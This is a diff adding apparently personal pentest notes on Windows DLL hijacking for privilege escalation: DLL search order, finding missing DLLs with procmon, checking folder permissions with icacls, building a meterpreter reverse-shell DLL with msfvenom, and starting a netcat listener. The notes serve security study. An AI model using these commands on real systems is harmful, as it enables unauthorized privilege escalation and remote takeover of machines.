@@ -1,0 +1,51 @@
+<p><a href="https://pentestlab.blog/2017/03/27/dll-hijacking/">WPE-05 - DLL Hijacking</a>
+In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.</p>
+
+<p>It should be noted that when an application needs to load a DLL it will go through the following order:</p>
+
+<ol>
+  <li>The directory from which the application is loaded</li>
+  <li>C:\Windows\System32</li>
+  <li>C:\Windows\System</li>
+  <li>C:\Windows</li>
+  <li>The current working directory</li>
+  <li>Directories in the system PATH environment variable</li>
+  <li>Directories in the user PATH environment variable</li>
+</ol>
+
+<h1 id="1-find-process-with-missing-dll">1 find process with missing dll</h1>
+<p>use procmon from sysinternals to check for missing dlls (“NAME NOT FOUND”)</p>
+
+<h2 id="11-filters">1.1 filters</h2>
+<p>Process Name is &lt;[Value]&gt;
+Result is &lt;[NAME NOT FOUND]&gt;
+Path ends with .dll*</p>
+
+<h1 id="2-confirm-that-you-have-write-permissions-to-any-of-the-folders">2 confirm that you have write permissions to any of the folders</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:/path/to_inject/dll&gt;: icacls .
+ risus-PC\risusUser:(I)(OI)(CI)(F)
+</code></pre></div></div>
+
+<p>importantn values:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a sequence of simple rights:
+     N — no access
+     F — full access
+     M — modify access
+     RX — read and execute access
+     R — read-only access
+     W — write-only access
+     D — delete access
+</code></pre></div></div>
+
+<h1 id="3-create-dll">3 create dll</h1>
+<h2 id="31-reverse-shell">3.1 reverse shell</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f dll -o evil.dll
+</code></pre></div></div>
+<h2 id="32-create-user">3.2 create user</h2>
+<p>TODO</p>
+
+<h1 id="4-start-listener">4 start listener</h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+</code></pre></div></div>
+
+<h1 id="5-copy-dll-to-path-and-rerun-serviceprogram">5 copy dll to path and rerun service/program</h1>
